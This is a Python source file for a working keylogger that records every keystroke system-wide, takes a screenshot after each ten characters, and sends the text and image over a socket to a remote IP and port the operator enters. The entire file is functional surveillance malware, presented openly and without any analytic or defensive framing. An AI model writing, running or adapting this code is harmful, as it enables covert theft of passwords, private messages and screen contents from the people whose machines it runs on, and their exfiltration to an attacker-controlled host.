import socket
import time
import pyautogui
import threading
from pynput.keyboard import Listener, Key
from io import BytesIO
import queue

text_buffer = ""  # Stores captured keystrokes
data_queue = queue.Queue()  # Queue for handling background data sending

host = input("Enter IP Address: ")
port = int(input("Enter Port Number: "))


# Take Screenshot
def take_screenshot():
    ss = pyautogui.screenshot()
    buffer = BytesIO()
    ss.save(buffer, format="PNG")
    return buffer.getvalue()


# Send Text
def send_text(text):
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((host, port))
        soc.send("text".encode("utf-8"))  # Tell the server it's text
        time.sleep(0.2)  # Ensure server reads type first
        soc.send(text.encode())
        soc.close()
    except Exception as e:
        print(f"[ERROR] Failed to send text: {e}")


# Send Image
def send_image(image):
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.connect((host, port))
        soc.send("image".encode("utf-8"))  # Tell the server it's an image
        time.sleep(0.2)  # Ensure server reads type first
        soc.sendall(image)
        soc.close()
    except Exception as e:
        print(f"[ERROR] Failed to send image: {e}")


# Worker function for handling sending data in the background
def worker():
    while True:
        text, image = data_queue.get()
        send_text(text)
        send_image(image)
        data_queue.task_done()


# Start the background worker thread
threading.Thread(target=worker, daemon=True).start()


# Key press event
def on_press(key):
    global text_buffer

    if key == Key.enter:
        text_buffer += "\n"
    elif key == Key.tab:
        text_buffer += "\t"
    elif key == Key.space:
        text_buffer += " "
    elif key in (Key.shift, Key.ctrl_l, Key.ctrl_r, Key.esc):
        return  # Ignore these keys
    elif key == Key.backspace and text_buffer:
        text_buffer = text_buffer[:-1]  # Remove last character
    elif hasattr(key, "char"):  # Normal key
        text_buffer += key.char

    if len(text_buffer) >= 10:  # Send data after 10 keypresses
        image = take_screenshot()
        data_queue.put((text_buffer, image))
        text_buffer = ""  # Clear buffer


# Key release event (triggers sending data)
def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener


# Start keylogger listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
